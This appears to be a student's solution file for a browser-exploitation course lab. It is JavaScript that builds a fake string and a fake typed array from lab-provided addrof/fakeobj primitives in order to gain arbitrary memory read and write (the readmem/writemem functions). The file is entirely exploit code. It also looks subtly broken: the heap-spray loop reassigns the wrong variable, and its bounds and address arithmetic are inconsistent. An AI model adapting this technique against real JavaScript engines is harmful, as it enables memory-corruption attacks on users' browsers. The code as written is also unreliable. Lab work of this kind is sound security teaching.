/*
 * TODO: Part B solution goes here!
 */

let dataPlane = new Uint32Array(1);
let fakedStr = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);

// use heap spraying to find the address of a typed array in range of fakedstr length
let heapArray = new Uint32Array(72);
while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(heapArray) > cs361s.addrof(fakedStr) - 56 + (10 ** 28)) {
    array = new Uint32Array(72);
}

let testing = function(){
    print('Test');
    print(cs361s.addrof(fakedStr));
    print(cs361s.addrof(fakedStr) - 56);
    print(cs361s.addrof(fakedStr) - 56 + (2 ** 28));
};

let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakedStr) + 16);
let bytes = new Uint8Array(72);
//move chars rom fake string to bytes array
var index = 0;
while(index < bytes.length){
    bytes[index] = fakedStr.charCodeAt(offset + index);
    index++;
}

// write the bytes we want into the data plane
for (let i = 0; i < 8; i++) {
    let byte = cs361s.addrof(dataPlane);
    for (let j = 0; j < i; j++) {
        byte = byte - bytes[56 + j];
        byte = byte / 256;
    }
    bytes[56 + i] = byte % 256;
}

// create the control plane
bytes[0] = bytes[0] + 1;
let cBuf = String.fromCharCode(...bytes);
let controlPlane = cs361s.fakeobj(cs361s.addrof(cBuf) + 16);

let fourWordBytes = 2 ** 32;

let readmem = function(addr) {
    controlPlane[14] = addr % fourWordBytes;
    controlPlane[15] = (addr - controlPlane[0]) / fourWordBytes;
    return dataPlane[0];
};

let writemem = function(addr, val) {
    controlPlane[14] = addr % fourWordBytes;
    controlPlane[15] = (addr - controlPlane[0]) / fourWordBytes;
    dataPlane[0] = val;
};
